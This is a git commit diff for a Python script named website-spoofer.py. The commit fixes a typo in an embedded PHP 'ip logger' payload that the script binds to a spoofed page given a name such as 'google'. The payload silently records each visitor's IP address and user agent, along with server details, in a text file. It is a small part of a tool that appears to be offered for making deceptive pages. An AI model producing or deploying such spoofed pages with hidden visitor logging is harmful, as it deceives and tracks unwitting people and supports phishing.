b024cb1a6f01879a4bc7d9b2b25cfc0fa482c932
DHens <dawsonhensel@gmail.com>
2015-03-25 22:16:50 -0700

    Fixed User Agent misspelling
    changed:
    ipLogger =
    '<?php\n$file="iplog.txt";\n$f=fopen($file,"a");\nfwrite($f,"-------------------------"."\n");\nfwrite($f,"IP
    Address:".$_SERVER["REMOTE_ADDR"]."\n");\nfwrite($f,"User
    Agemt:".$_SERVER["HTTP_USER_AGENT"]."\n");\nfwrite($f,"Host
    Name:".php_uname("n")."\n");\nfwrite($f,"Operating
    System:".php_uname("v")."(".php_uname("s").")"."\n");\nfclose($f);\n?>'
    
    ipLogger =
    '<?php\n$file="iplog.txt";\n$f=fopen($file,"a");\nfwrite($f,"-------------------------"."\n");\nfwrite($f,"IP
    Address:".$_SERVER["REMOTE_ADDR"]."\n");\nfwrite($f,"User
    Agent:".$_SERVER["HTTP_USER_AGENT"]."\n");\nfwrite($f,"Host
    Name:".php_uname("n")."\n");\nfwrite($f,"Operating
    System:".php_uname("v")."(".php_uname("s").")"."\n");\nfclose($f);\n?>'

--- website-spoofer.py
+++ website-spoofer.py
@@ -43,7 +43,7 @@ payload = raw_input()
 
 # ip logger payload
 if payload == '1':
-    ipLogger = '<?php\n$file="iplog.txt";\n$f=fopen($file,"a");\nfwrite($f,"-------------------------"."\n");\nfwrite($f,"IP Address:".$_SERVER["REMOTE_ADDR"]."\n");\nfwrite($f,"User Agemt:".$_SERVER["HTTP_USER_AGENT"]."\n");\nfwrite($f,"Host Name:".php_uname("n")."\n");\nfwrite($f,"Operating System:".php_uname("v")."(".php_uname("s").")"."\n");\nfclose($f);\n?>'
+    ipLogger = '<?php\n$file="iplog.txt";\n$f=fopen($file,"a");\nfwrite($f,"-------------------------"."\n");\nfwrite($f,"IP Address:".$_SERVER["REMOTE_ADDR"]."\n");\nfwrite($f,"User Agent:".$_SERVER["HTTP_USER_AGENT"]."\n");\nfwrite($f,"Host Name:".php_uname("n")."\n");\nfwrite($f,"Operating System:".php_uname("v")."(".php_uname("s").")"."\n");\nfclose($f);\n?>'
     print '\nCreate new name for file: eg. (google)\n'
     newFileName = raw_input() + '.php'
     print '\nBinding an ip logger to ' + newFileName
